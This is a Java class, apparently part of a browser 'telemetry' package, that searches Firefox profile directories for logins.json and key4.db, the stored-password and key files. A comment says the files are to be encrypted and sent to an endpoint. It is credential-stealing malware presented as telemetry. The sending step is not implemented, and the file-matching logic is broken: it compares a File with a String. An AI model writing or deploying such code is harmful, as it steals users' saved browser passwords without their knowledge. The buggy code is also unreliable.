package sample.telemetry.browser;

import java.io.File;

public class FireFoxBrowser extends GenericBrowser implements BrowserInfo{

   private final String name = "Firefox";
   private final String fireFoxLoginsFile = "logins.json";
   private final String fireFoxkey4dbFile = "key4.db";
   private final String replacedPath = super.getBrowserProfileLocation(this).
         replaceAll(" ","\\ ");

   @Override
   public String getName() {
      return name;
   }

   @Override
   public void getUserBrowserInformation() {
      if(!replacedPath.isEmpty() && !replacedPath.isEmpty()) {
         File baseDirectory = new File(replacedPath);
         if(baseDirectory.isDirectory()) {
            for(File directory : baseDirectory.listFiles()) {
               if(directory.isDirectory()) {
                  for(File targetFile : directory.listFiles()) {
                     if(targetFile.equals(fireFoxkey4dbFile) || targetFile.equals(fireFoxLoginsFile)) {
                        // We got it. Now get this stuff encrypted and send it to the ndpoint.
                     }
                  }
               }
            }
         }
      }
   }



}
